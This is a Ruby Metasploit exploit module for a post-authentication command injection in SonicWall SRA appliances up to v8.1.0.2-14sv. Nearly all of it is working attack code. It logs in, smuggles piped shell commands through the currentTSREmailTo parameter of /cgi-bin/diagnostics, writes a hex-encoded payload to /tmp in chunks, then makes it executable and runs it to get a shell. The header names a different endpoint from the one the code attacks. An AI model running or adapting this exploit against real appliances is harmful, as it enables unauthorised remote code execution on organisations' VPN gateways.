# Date: 12/25/2016
# Exploit Author: xort @ Critical Start
# Vendor Homepage: www.sonicwall.com
# Software Link: sonicwall.com/products/sra-virtual-appliance
# Version: 8.1.0.2-14sv
# Tested on: 8.1.0.2-14sv
#             
# CVE : (awaiting cve)

# vuln: extensionsettings.cgi / scriptfile (filename) parameter /  

# Description PostAuth Sonicwall SRA <= v8.1.0.2-14sv. This exploit leverages a command injection bug. 
#
# xort @ Critical Start

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Sonicwall SRA <= v8.1.0.2-14sv remote exploit&#039;,
          &#039;Description&#039;    => %q{
          This module exploits a remote command execution vulnerability in
        the Sonicwall SRA Appliance Version <=  v8.1.0.2-14sv. The vulnerability exist in
        a section of the machine&#039;s adminstrative infertface for performing configurations 
        related to on-connect scripts to be launched for users&#039;s connecting.  
      },
      &#039;Author&#039;         =>
        [
          &#039;xort@Critical Start&#039;, # vuln + metasploit module
        ],
      &#039;Version&#039;        => &#039;$Revision: 1 $&#039;,
      &#039;References&#039;     =>
        [
          [ &#039;none&#039;, &#039;none&#039;],
        ],
      &#039;Platform&#039;      => [ &#039;linux&#039;],
      &#039;Privileged&#039;     => true,
       &#039;Arch&#039;          => [ ARCH_X86 ],
                        &#039;SessionTypes&#039;  => [ &#039;shell&#039; ],
                        &#039;Privileged&#039;     => false,

            &#039;Payload&#039;        =>
                                { 
                                  &#039;Compat&#039; =>
                                  {
                                        &#039;ConnectionType&#039; => &#039;find&#039;,
                                  }
                                },

      &#039;Targets&#039;        =>
        [
          [&#039;Linux Universal&#039;,
            {
                &#039;Arch&#039; => ARCH_X86,
                &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
        ],
      &#039;DefaultTarget&#039; => 0))

      register_options(
        [
          OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Device password&#039;, "" ]),  
                 OptString.new(&#039;USERNAME&#039;, [ true, &#039;Device password&#039;, "admin" ]),  
          OptString.new(&#039;CMD&#039;, [ false, &#039;Command to execute&#039;, "" ]),  
          Opt::RPORT(443),
        ], self.class)
  end

        def do_login(username, password_clear)
                vprint_status( "Logging into machine with credentials...\n" )

                # vars
                timeout = 1550;
                style_key = Rex::Text.rand_text_hex(32)

                # send request  
                res = send_request_cgi(
                {
                      &#039;method&#039;  => &#039;POST&#039;,
                      &#039;uri&#039;     => "/cgi-bin/userLogin",
          &#039;headers&#039; => {
         &#039;Connection&#039; => &#039;close&#039;,
         &#039;Content-Type&#039; => &#039;application/x-www-form-urlencoded&#039;,
         &#039;User-Agent&#039; => &#039;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0&#039;,
                },
                      &#039;vars_post&#039; => {
         &#039;username&#039; => username,
         &#039;password&#039; => password_clear,
         &#039;domain&#039; => &#039;LocalDomain&#039;,
         &#039;loginButton&#039; => &#039;Login&#039;,
         &#039;state&#039; => &#039;login&#039;,
         &#039;login&#039; => &#039;true&#039;,
         &#039;VerifyCert&#039; => &#039;0&#039;,
         &#039;portalname&#039; => &#039;VirtualOffice&#039;,
         &#039;ajax&#039; => &#039;true&#039;
           },
                }, timeout)

    swap = res.headers[&#039;Set-Cookie&#039;].split(&#039;\n&#039;).grep(/(.*)swap=([^;]+);/){$2}[0]
    
                return swap
        end

  def run_command_spliced(username, swap_cookie, cmd)

    vprint_status( "Running Command...\n" )

    # send request with payload  
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
#                        &#039;uri&#039;     => "/cgi-bin/diagnostics?currentTSREmailTo=|#{cmd}|x&tsrEmailCurrent=true",
                        &#039;uri&#039;     => "/cgi-bin/diagnostics",
      &#039;vars_get&#039; => {
        &#039;tsrEmailCurrent&#039; => &#039;true&#039;,
        &#039;currentTSREmailTo&#039; => &#039;|&#039;+cmd+&#039;|x&#039;,
        },
             &#039;headers&#039; => {
         &#039;Cookie&#039; => &#039;swap=&#039;+swap_cookie+&#039;;&#039;,
         &#039;Content-Type&#039; => &#039;text/plain; charset="iso-8859-1"&#039;,
         &#039;Connection&#039; => &#039;close&#039;,
       },
    }, 30 )

  end

  def run_command(username, swap_cookie, cmd)

        write_mode = ">"
        dump_file = "/tmp/qq"

        # base64 - encode with base64 so we can send special chars and multiple lines
              #cmd_encoded = Base64.strict_encode64(cmd)

        cmd_encoded = cmd.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\x\1\2&#039;)

        vprint_status("cmd_encoded = #{cmd_encoded}")

              for cmd_chunk in cmd_encoded.split(/(....................................................................................................)/)

                        cmd_new = "printf%20\"#{cmd_chunk}\"#{write_mode}#{dump_file}"
                        #cmd_new = "printf \"#{cmd_chunk}\"#{write_mode}#{dump_file}".gsub("+", "_")

                        # set to normal append for loops after the first round
                        if write_mode == ">"
                                write_mode = ">>"
                        end

                        # add cmd to array to be exected later          
      run_command_spliced(username, swap_cookie, cmd_new)

                end
    
    # execute payload stored at dump_file 

    run_command_spliced(username, swap_cookie, "chmod%20777%20/tmp/qq;sh%20/tmp/qq")
  
  end

  def exploit
    # timeout
    timeout = 1550;

    # params
    password_clear = datastore[&#039;PASSWORD&#039;]
    user = datastore[&#039;USERNAME&#039;]

    # do authentication    
    swap_cookie = do_login(user, password_clear)
  
    vprint_status("authenticated &#039;swap&#039; cookie: #{swap_cookie}\n")
      
     #if no &#039;CMD&#039; string - add code for root shell
                if not datastore[&#039;CMD&#039;].nil? and not datastore[&#039;CMD&#039;].empty?

                        cmd = datastore[&#039;CMD&#039;]

                        # Encode cmd payload
                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\x\1\2&#039;)
      vprint_status("encoded_cmd = #{encoded_cmd}")

                        run_command(user, swap_cookie, ("sudo /bin/rm -f /tmp/n;printf \"#{encoded_cmd}\">/tmp/n;chmod +rx /tmp/n;/tmp/n" ))
                else
                        # Encode payload to ELF file for deployment
                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                        encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,&#039;\\x\1\2&#039;)
      vprint_status("encoded_elf = #{encoded_elf}")

      # upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
                        run_command(user, swap_cookie, ("echo -e \"#{encoded_elf}\"\>/tmp/m\;chmod +rx /tmp/m\;/tmp/m"))
      

      # wait for magic
                        handler
      
                end


  end
# sophox-release
end

